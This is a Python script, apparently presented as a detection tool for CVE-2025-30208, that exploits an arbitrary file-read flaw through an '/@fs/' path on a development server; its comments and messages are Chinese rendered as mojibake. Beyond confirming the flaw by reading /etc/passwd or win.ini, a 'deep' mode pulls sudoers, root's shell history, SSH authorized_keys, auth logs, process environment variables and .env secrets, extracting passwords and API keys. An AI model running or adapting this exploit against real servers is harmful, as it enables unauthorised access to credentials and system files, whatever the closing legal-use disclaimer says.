import argparse
import requests
import sys
import re

# å¿½ç•¥ HTTPS æŠ¥é”™
requests.packages.urllib3.disable_warnings()

# æ§åˆ¶å°é¢œè‰²ç±»
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'  # æ–°å¢ç™½è‰²å®šä¹‰
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{Color.CYAN}{Color.BOLD}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     CVE-2025-30208 æ¼æ´æ£€æµ‹å·¥å…·ï¼ˆå•ç›®æ ‡ï¼‰          â•‘
â•‘       Author: lll_lll                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Color.RESET}
""")

def try_read_file(url, filepath, proxy=None) -> str | None:
    """
    åˆ©ç”¨ @fs è·¯å¾„å°è¯•è¯»å–æ–‡ä»¶
    """
    proxies = {"http": proxy, "https": proxy} if proxy else None
    target_url = f"{url}/@fs/{filepath}?import&raw?&"
    print(f"{Color.YELLOW}[Â·] å°è¯•è¯»å–æ–‡ä»¶: {filepath}{Color.RESET}")

    try:
        resp = requests.get(target_url, proxies=proxies, verify=False, timeout=10)
        if resp.status_code == 200 and len(resp.text.strip()) > 0:
            print(f"{Color.GREEN}[+] æˆåŠŸè¯»å–æ–‡ä»¶å†…å®¹ï¼{Color.RESET}")
            return resp.text
        else:
            print(f"{Color.RED}[-] è¯»å–å¤±è´¥æˆ–æ— å†…å®¹è¿”å›ã€‚{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[!] è¯·æ±‚å¼‚å¸¸: {e}{Color.RESET}")
    return None

def default_check(url, proxy=None) -> str | None:
    """
    é»˜è®¤è¯»å–æ•æ„Ÿæ–‡ä»¶ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´
    """
    print(f"{Color.BOLD}[Â·] æœªæŒ‡å®šæ–‡ä»¶è·¯å¾„ï¼Œå°è¯•é»˜è®¤è·¯å¾„æ£€æµ‹...{Color.RESET}")
    
    result = try_read_file(url, "etc/passwd", proxy)
    if result and "root" in result:
        return result

    result = try_read_file(url, "C://windows/win.ini", proxy)
    if result and "; for 16-bit app support" in result:
        return result

    return None

def basic_system_probe(url, proxy=None):
    """
    åŸºç¡€ç³»ç»Ÿä¿¡æ¯æ¢æµ‹
    """
    print(f"{Color.BOLD}{Color.YELLOW}[Â·] æ­£åœ¨è¿›è¡ŒåŸºç¡€ç³»ç»Ÿæ¢æµ‹...{Color.RESET}")
    
    guesses = {
        "æ“ä½œç³»ç»Ÿåˆ¤æ–­": [("etc/passwd", "Linux"),
                       ("C:/Windows/win.ini", "Windows")],
        "å½“å‰å·¥ä½œç›®å½•": [("proc/self/cwd", "Linux"),
                       ("C:/Windows/Temp", "Windows")],
        "å®¹å™¨è™šæ‹Ÿç¯å¢ƒ": [("proc/1/cgroup", "Linux")]
    }

    detected = {}
    for tag, files in guesses.items():
        for filepath, os_type in files:
            content = try_read_file(url, filepath, proxy)
            if content:
                detected[tag] = {
                    "path": filepath,
                    "os": os_type,
                    "content": content[:200].strip().replace('\n', ' ')
                }
                break

    print("\n" + "=" * 60)
    if detected:
        print(f"{Color.GREEN}[âˆš] åŸºç¡€æ¢æµ‹ç»“æœï¼š{Color.RESET}")
        for key, val in detected.items():
            print(f"{Color.BOLD}- {key}:{Color.RESET}")
            print(f"  è·¯å¾„: {val['path']}   ç³»ç»Ÿ: {val['os']}")
            print(f"  å†…å®¹: {Color.CYAN}{val['content']}...{Color.RESET}")
    else:
        print(f"{Color.RED}[-] æœªå‘ç°æœ‰æ•ˆç³»ç»Ÿä¿¡æ¯{Color.RESET}")
    print("=" * 60 + "\n")

def deep_system_probe(url, proxy=None):
    """
    å¢å¼ºç‰ˆç³»ç»Ÿæ¢æµ‹ï¼ˆä¼ä¸šçº§æ·±åº¦æ£€æµ‹ï¼‰
    """
    print(f"{Color.BOLD}{Color.YELLOW}[Â·] æ­£åœ¨è¿›è¡Œä¼ä¸šçº§æ·±åº¦ç¯å¢ƒæ¢æµ‹ï¼ˆLv.3ï¼‰...{Color.RESET}")

    # åŠ¨æ€ç”Ÿæˆæ£€æµ‹è·¯å¾„
    common_users = ["root", "ubuntu", "ec2-user", "admin", "www-data", "appuser"]
    authorized_keys_paths = [f"home/{user}/.ssh/authorized_keys" for user in common_users] + ["root/.ssh/authorized_keys"]
    
    guesses = {
        "ç”¨æˆ·æƒé™è¯†åˆ«ï¼ˆä¼ä¸šçº§ï¼‰": [
            ("etc/sudoers", "Linux", "sudoæƒé™é…ç½®"),
            ("root/.bash_history", "Linux", "rootå†å²å‘½ä»¤"),
            *[(path, "Linux", "SSHå…¬é’¥æ£€æµ‹") for path in authorized_keys_paths],
            ("var/log/auth.log", "Linux", "è®¤è¯æ—¥å¿—åˆ†æ")
        ],
        "WebæœåŠ¡æ·±åº¦å‰–æ": [
            ("proc/self/environ", "Linux", "ç¯å¢ƒå˜é‡æå–"),
            ("proc/self/cmdline", "Linux", "å¯åŠ¨å‘½ä»¤åˆ†æ"),
            (".env", "Linux", "æ•æ„Ÿå˜é‡æ‰«æ"),
            ("web.config", "Windows", "IISé…ç½®"),
            ("appsettings.json", "Linux", "ASP.NETé…ç½®")
        ],
        "ä¸­é—´ä»¶å…¨æ ˆæ£€æµ‹": [
            ("etc/nginx/nginx.conf", "Linux", "Nginxé…ç½®"),
            ("etc/apache2/apache2.conf", "Linux", "Apacheé…ç½®"),
            ("usr/local/tomcat/conf/server.xml", "Linux", "Tomcaté…ç½®"),
            ("proc/version", "Linux", "å†…æ ¸ç‰ˆæœ¬æ£€æµ‹")
        ],
        "äº‘ç¯å¢ƒæŒ‡çº¹è¯†åˆ«": [
            ("sys/class/dmi/id/product_name", "Linux", "è™šæ‹ŸåŒ–ç±»å‹"),
            ("etc/cloud/cloud.cfg", "Linux", "Cloud-Inité…ç½®"),
            ("var/lib/cloud/instance", "Linux", "äº‘å…ƒæ•°æ®"),
            ("metadata.google.internal", "Linux", "GCPæ ‡è¯†")
        ]
    }

    detected = {}
    risk_level = 0

    for category, items in guesses.items():
        for filepath, os_type, detect_type in items:
            content = try_read_file(url, filepath, proxy)
            if not content:
                continue
                
            # æ·±åº¦åˆ†æé€»è¾‘
            analysis, risk = "", 0
            if category == "ç”¨æˆ·æƒé™è¯†åˆ«ï¼ˆä¼ä¸šçº§ï¼‰":
                if "sudoers" in filepath:
                    analysis = "ğŸ›¡ï¸ Sudoç­–ç•¥åˆ†æ:\n"
                    if "NOPASSWD" in content:
                        analysis += f"  {Color.RED}é«˜å±! å‘ç°å…å¯†sudoæƒé™{Color.RESET}\n"
                        risk += 2
                    if "(ALL:ALL) ALL" in content:
                        analysis += f"  {Color.YELLOW}è­¦å‘Š! å®½æ³›æƒé™é…ç½®{Color.RESET}\n"
                        risk += 1
                elif "bash_history" in filepath:
                    dangerous_cmds = ["ssh", "scp", "sudo", "wget", "curl"]
                    found = [cmd for cmd in dangerous_cmds if cmd in content]
                    if found:
                        analysis = f"ğŸ” å‘ç°æ•æ„Ÿå‘½ä»¤: {Color.RED}{', '.join(found)}{Color.RESET}\n"
                        risk += 1
                    analysis += f"ğŸ“œ æœ€å5æ¡å‘½ä»¤:\n  " + "\n  ".join(content.split('\n')[-5:])
                elif "authorized_keys" in filepath:
                    key_count = len(content.strip().split('\n'))
                    analysis = f"ğŸ”‘ å‘ç° {key_count} æ¡SSHå…¬é’¥ï¼ˆç”¨æˆ·ï¼š{filepath.split('/')[1]}ï¼‰"
                    risk += 1 if key_count > 0 else 0

            elif category == "WebæœåŠ¡æ·±åº¦å‰–æ":
                if "environ" in filepath:
                    env_vars = dict(pair.split('=', 1) for pair in content.split('\x00') if '=' in pair)
                    sensitive_keys = ["PASSWORD", "SECRET", "TOKEN"]
                    found_vars = [k for k in env_vars.keys() if any(s in k for s in sensitive_keys)]
                    analysis = "ğŸ”§ ç¯å¢ƒå˜é‡åˆ†æ:\n"
                    analysis += f"  PATH: {env_vars.get('PATH','')}\n"
                    analysis += f"  USER: {env_vars.get('USER','')}\n"
                    if found_vars:
                        analysis += f"  {Color.RED}æ•æ„Ÿå˜é‡: {', '.join(found_vars)}{Color.RESET}"
                        risk += 2
                elif ".env" in filepath:
                    secrets = re.findall(r'(API_KEY|PASSWORD)=([^\s]+)', content)
                    if secrets:
                        analysis = f"ğŸ” å‘ç° {len(secrets)} ç»„æ•æ„Ÿå‡­è¯:\n"
                        for k, v in secrets:
                            analysis += f"  {k}: {v[:4]}****{v[-2:]}\n"
                        risk += 3

            risk_level += risk
            detected.setdefault(category, []).append({
                "è·¯å¾„": filepath,
                "ç³»ç»Ÿ": os_type,
                "åŸå§‹å†…å®¹": content,
                "åˆ†æ": analysis,
                "é£é™©å€¼": risk,
                "æŒ‡çº¹ç‰¹å¾": detect_type
            })

    # ä¼ä¸šçº§æŠ¥å‘Šè¾“å‡º
    print(f"\n{Color.BOLD}{Color.RED}â–„â– â–„â– â–„â–  æ·±åº¦æ£€æµ‹æŠ¥å‘Š â– â–„â– â–„â– â–„{Color.RESET}")
    risk_color = Color.RED if risk_level > 5 else Color.YELLOW if risk_level > 2 else Color.GREEN
    print(f"\n{Color.BOLD}âš¡ ç»¼åˆé£é™©è¯„çº§: {risk_color}{'é«˜å±' if risk_level>5 else 'ä¸­å±' if risk_level>2 else 'ä½å±'} ({risk_level}åˆ†){Color.RESET}")
    
    for category, items in detected.items():
        print(f"\n{Color.BOLD}â–Œ {category} {Color.CYAN}[{len(items)}é¡¹å‘ç°]{Color.RESET}")
        for item in items:
            print(f"\n  {Color.YELLOW}â–¶ æ£€æµ‹é¡¹: {item['æŒ‡çº¹ç‰¹å¾']} ({item['è·¯å¾„']})")
            print(f"  {Color.CYAN}â”œâ”€ é£é™©å€¼: {item['é£é™©å€¼']}")
            print(f"  â”œâ”€ ç³»ç»Ÿç±»å‹: {item['ç³»ç»Ÿ']}")
            if item['åˆ†æ']:
                print(f"  â”œâ”€ æ·±åº¦åˆ†æ:\n{item['åˆ†æ']}")
            print(f"  â””â”€ æ ·æœ¬æ‘˜è¦: {Color.WHITE}{item['åŸå§‹å†…å®¹'][:150].strip()}...{Color.RESET}")
    
    if risk_level > 3:
        print(f"\n{Color.BOLD}ğŸ”§ å®‰å…¨å»ºè®®:")
        print(f"  {Color.RED}1. ç«‹å³ä¿®å¤ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´")
        print(f"  2. æ£€æŸ¥å‘ç°çš„æ•æ„Ÿå‡­è¯æ˜¯å¦å·²æ³„éœ²")
        print(f"  3. å®¡è®¡é«˜é£é™©æƒé™é…ç½®{Color.RESET}")
    print("\n"+ "="*60)

def main():
    banner()
    parser = argparse.ArgumentParser(description="CVE-2025-30208 ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´æ£€æµ‹å·¥å…·")
    parser.add_argument("-u", "--url", required=True, help="ç›®æ ‡ URLï¼ˆä¾‹å¦‚ï¼šhttp://127.0.0.1:5173ï¼‰")
    parser.add_argument("-r", "--file-path", help="è¦è¯»å–çš„æ•æ„Ÿæ–‡ä»¶è·¯å¾„ï¼ˆä¾‹å¦‚ï¼š/etc/shadowï¼‰")
    parser.add_argument("-i", "--info", action="store_true", help="åŸºç¡€ç³»ç»Ÿä¿¡æ¯æ¢æµ‹")
    parser.add_argument("-d", "--deep", action="store_true", help="å¯ç”¨å¢å¼ºæ¢æµ‹ï¼Œè·å–æ›´å¤šç³»ç»Ÿä¿¡æ¯")
    parser.add_argument("-p", "--proxy", help="HTTP/HTTPS ä»£ç†åœ°å€ï¼ˆä¾‹å¦‚ï¼šhttp://127.0.0.1:8080ï¼‰")

    args = parser.parse_args()
    url = args.url.strip().rstrip('/')
    proxy = args.proxy

    print(f"{Color.BOLD}[+] å¼€å§‹æ£€æµ‹ç›®æ ‡ï¼š{url}{Color.RESET}\n")

    if args.info:
        basic_system_probe(url, proxy)
    if args.deep:
        deep_system_probe(url, proxy)

    if args.file_path:
        result = try_read_file(url, args.file_path, proxy)
    else:
        result = default_check(url, proxy)

    print("\n" + "="*60)
    if result:
        print(f"{Color.GREEN}[âˆš] æ¼æ´å­˜åœ¨ï¼æˆåŠŸè¯»å–ç›®æ ‡æ–‡ä»¶ï¼š{args.file_path or 'é»˜è®¤è·¯å¾„'}{Color.RESET}")
        print(f"{Color.BOLD}ä»¥ä¸‹æ˜¯éƒ¨åˆ†å†…å®¹ï¼ˆæœ€å¤šæ˜¾ç¤º 500 å­—ç¬¦ï¼‰ï¼š{Color.RESET}\n")
        print(f"{Color.CYAN}{result[:500]}...{Color.RESET}")
        print("\n[!] è¯·åˆæ³•ä½¿ç”¨æ­¤å·¥å…·ï¼Œç¦æ­¢ç”¨äºæœªæˆæƒæµ‹è¯•ã€‚")
    else:
        print(f"{Color.RED}[-] æœªå‘ç°æ¼æ´æˆ–è¯»å–å¤±è´¥ã€‚{Color.RESET}")
    print("="*60 + "\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[Ã—] ç”¨æˆ·ä¸­æ–­ï¼Œç¨‹åºé€€å‡ºã€‚{Color.RESET}")
        sys.exit()